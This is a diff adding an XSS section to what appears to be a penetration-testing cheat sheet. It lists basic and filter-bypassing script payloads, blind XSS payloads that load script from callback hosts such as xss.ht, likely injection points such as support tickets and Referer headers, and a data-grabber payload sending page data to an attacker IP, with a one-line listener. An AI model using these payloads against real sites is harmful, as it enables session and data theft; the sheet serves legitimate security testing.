@@ -916,3 +916,54 @@ To set the domain name of the server in the URL that the Referrer is going to se
 </html>
 ```
 
+## XSS
+
+* [ ] try use **`h3ckt00r'"><`**
+* [ ] **`basics pyload '><script>alert(1)</script>`**
+* [ ] **`or <img src="X" onerror="alert('1')">`**
+* [ ] to bypass spaces use / ex **`<svg/onload=confirm(1)> or '><marguee onstart="[cookie ].find(confirm)">`**
+
+
+
+Blind XSS
+
+```
+"><script src="https://js.rip/<custom.name>"></script>
+"><script src=//<custom.subdomain>.xss.ht></script>
+<script>$.getScript("//<custom.subdomain>.xss.ht")</script>
+```
+
+#### &#x20;Blind XSS tools
+
+* [sleepy-puppy - Netflix](https://github.com/Netflix-Skunkworks/sleepy-puppy)
+* [bXSS - LewisArdern](https://github.com/LewisArdern/bXSS)
+* [ezXSS - ssl](https://github.com/ssl/ezXSS)
+
+#### Blind XSS endpoint
+
+* Contact forms
+* Ticket support
+* Referer Header
+  * Custom Site Analytics
+  * Administrative Panel logs
+* User Agent
+  * Custom Site Analytics
+  * Administrative Panel logs
+* Comment Box
+  * Administrative Panel
+
+#### Tips
+
+You can use a [Data grabber for XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss) and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind XSS testing tool.
+
+Eg. payload
+
+```html
+<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>
+```
+
+Eg. one-line HTTP server:
+
+```ruby
+ruby -run -e httpd  -p8080
+```
